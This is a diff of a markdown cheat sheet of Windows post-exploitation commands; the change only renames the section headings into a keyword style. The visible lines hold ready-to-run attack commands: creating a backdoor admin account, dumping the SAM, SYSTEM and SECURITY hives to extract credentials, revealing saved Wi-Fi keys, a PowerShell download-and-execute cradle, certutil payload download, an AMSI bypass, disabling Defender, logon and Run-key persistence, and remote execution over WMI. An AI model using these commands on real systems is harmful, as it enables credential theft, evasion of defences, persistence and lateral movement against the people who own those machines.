@@ -6,7 +6,7 @@
 
 ---
 
-## Current User & Hostname
+## current user windows
 Show the current user, domain, and machine name.
 
 ```bash
@@ -17,7 +17,7 @@ whoami /all && hostname
 
 ---
 
-## System Info Summary
+## system info windows
 Display detailed configuration including hotfixes and architecture.
 
 ```bash
@@ -28,7 +28,7 @@ systeminfo
 
 ---
 
-## Filter OS Name and Version
+## os version windows
 Quickly extract OS name and version from systeminfo.
 
 ```bash
@@ -39,7 +39,7 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 ---
 
-## List Local Users
+## list users windows
 Show all local user accounts.
 
 ```bash
@@ -50,7 +50,7 @@ net user
 
 ---
 
-## Show User Details
+## show user details windows
 Show details, group membership, and last logon for a user.
 
 ```bash
@@ -61,7 +61,7 @@ net user {{USERNAME:str}}
 
 ---
 
-## Add Local Admin User (Persistence)
+## add admin user windows
 Create a new user and add to the local Administrators group.
 
 ```bash
@@ -72,7 +72,7 @@ net user {{USERNAME:str:backup}} {{PASSWORD:str:Password123!}} /add && net local
 
 ---
 
-## List Network Configuration
+## ipconfig network windows
 Show TCP/IP configuration including DNS and IPv6.
 
 ```bash
@@ -83,7 +83,7 @@ ipconfig /all
 
 ---
 
-## Active Connections (netstat)
+## list connections windows netstat
 Show TCP/UDP connections, listening ports, and PIDs.
 
 ```bash
@@ -94,7 +94,7 @@ netstat -ano
 
 ---
 
-## ARP Cache
+## arp cache windows
 Display the local ARP table.
 
 ```bash
@@ -105,7 +105,7 @@ arp -a
 
 ---
 
-## Routing Table
+## routing table windows
 Print the local routing table.
 
 ```bash
@@ -116,7 +116,7 @@ route print
 
 ---
 
-## Show Wi-Fi Profiles
+## list wifi profiles windows
 List saved Wi-Fi profiles on the host.
 
 ```bash
@@ -127,7 +127,7 @@ netsh wlan show profiles
 
 ---
 
-## Reveal Wi-Fi Profile Password
+## reveal wifi password windows
 Display the cleartext key for a saved Wi-Fi profile.
 
 ```bash
@@ -138,7 +138,7 @@ netsh wlan show profile name="{{PROFILE:str}}" key=clear
 
 ---
 
-## List Installed Hotfixes
+## list hotfixes windows
 Enumerate installed Windows updates and KB numbers.
 
 ```bash
@@ -149,7 +149,7 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 ---
 
-## List Scheduled Tasks (Verbose)
+## list scheduled tasks windows
 Print all scheduled tasks with full detail.
 
 ```bash
@@ -160,7 +160,7 @@ schtasks /query /fo LIST /v
 
 ---
 
-## Search Registry for "password"
+## search registry password windows
 Recursively search HKLM for the string "password".
 
 ```bash
@@ -171,7 +171,7 @@ reg query HKLM /f password /t REG_SZ /s
 
 ---
 
-## Dump SAM and SYSTEM Hives
+## dump sam system hives windows
 Save SAM and SYSTEM registry hives for offline cred extraction.
 
 ```bash
@@ -182,7 +182,7 @@ reg save HKLM\SAM {{SAM:file:sam.hive}} && reg save HKLM\SYSTEM {{SYSTEM:file:sy
 
 ---
 
-## Dump SECURITY Hive
+## dump security hive windows
 Save the SECURITY hive for LSA secret extraction.
 
 ```bash
@@ -193,7 +193,7 @@ reg save HKLM\SECURITY {{SEC:file:security.hive}}
 
 ---
 
-## List Stored Credentials
+## list stored creds windows cmdkey
 Show usernames and credential targets stored in Windows Credential Manager.
 
 ```bash
@@ -204,7 +204,7 @@ cmdkey /list
 
 ---
 
-## Find Encrypted Files
+## find encrypted files windows
 Locate EFS-encrypted files on local drives.
 
 ```bash
@@ -215,7 +215,7 @@ cipher /u /n
 
 ---
 
-## Force Reveal Hidden Items (PowerShell)
+## reveal hidden items windows
 Show hidden items including dotfiles and system files.
 
 ```bash
@@ -226,7 +226,7 @@ gci -force {{PATH:str:.}}
 
 ---
 
-## Download File (PowerShell IWR)
+## download file windows iwr
 Download a file from a remote URL to disk.
 
 ```bash
@@ -237,7 +237,7 @@ iwr -Uri {{URL:url}} -OutFile {{OUTFILE:file:C:\\Users\\Public\\file.exe}}
 
 ---
 
-## Download via certutil (CMD)
+## download file windows certutil
 Use certutil to download a payload (off-by-default URL cache).
 
 ```bash
@@ -248,7 +248,7 @@ certutil -urlcache -split -f {{URL:url}} {{OUTFILE:file:C:\\Users\\Public\\paylo
 
 ---
 
-## IEX Cradle (PowerShell)
+## iex download cradle windows
 Download and execute a PowerShell script in memory.
 
 ```bash
@@ -259,7 +259,7 @@ powershell -ep bypass -nop -c "IEX (IWR {{URL:url}} -UseBasicParsing)"
 
 ---
 
-## Encoded Command Wrapper (PowerShell)
+## encoded command windows powershell
 Base64-encode a command and run it via -EncodedCommand.
 
 ```bash
@@ -270,7 +270,7 @@ powershell -NoProfile -EncodedCommand $([Convert]::ToBase64String([Text.Encoding
 
 ---
 
-## AMSI In-Memory Bypass (PowerShell)
+## bypass amsi windows
 Disable AMSI for the current PowerShell session.
 
 ```bash
@@ -281,7 +281,7 @@ powershell -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUti
 
 ---
 
-## Disable Defender Real-Time (PowerShell, Admin)
+## disable defender windows
 Disable Defender real-time monitoring (requires admin).
 
 ```bash
@@ -292,7 +292,7 @@ powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 ---
 
-## Schtask Persistence at Logon
+## persist schtask logon windows
 Create a scheduled task that runs a payload at user logon.
 
 ```bash
@@ -303,7 +303,7 @@ schtasks /create /tn "{{NAME:str:Updater}}" /tr "powershell.exe -ExecutionPolicy
 
 ---
 
-## Run Key Persistence (HKCU)
+## persist run key windows
 Add a registry Run value for current-user persistence.
 
 ```bash
@@ -314,7 +314,7 @@ powershell -c "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\Curr
 
 ---
 
-## WMI Remote Process Create
+## exec remote wmi windows
 Spawn a process on a remote host via WMI.
 
 ```bash
@@ -325,7 +325,7 @@ wmic /node:{{TARGET:ip}} /user:{{USERNAME:str}} /password:{{PASSWORD:str}} proce
 
 ---
 
-## Invoke-Command Remote Execution
+## exec remote invoke-command windows
 Run a script block on a remote host via PSRemoting.
 
 ```bash
@@ -336,7 +336,7 @@ powershell -c "Invoke-Command -ComputerName {{TARGET:str}} -ScriptBlock { {{CMD:
 
 ---
 
-## Get-WmiObject SMB Shares
+## list shares wmi windows
 Enumerate SMB shares on a host via WMI.
 
 ```bash
@@ -347,7 +347,7 @@ powershell -c "Get-WmiObject -Class Win32_Share -ComputerName {{TARGET:str:.}}"
 
 ---
 
-## Get-EventLog Security
+## read security eventlog windows
 Retrieve recent Security event log entries.
 
 ```bash
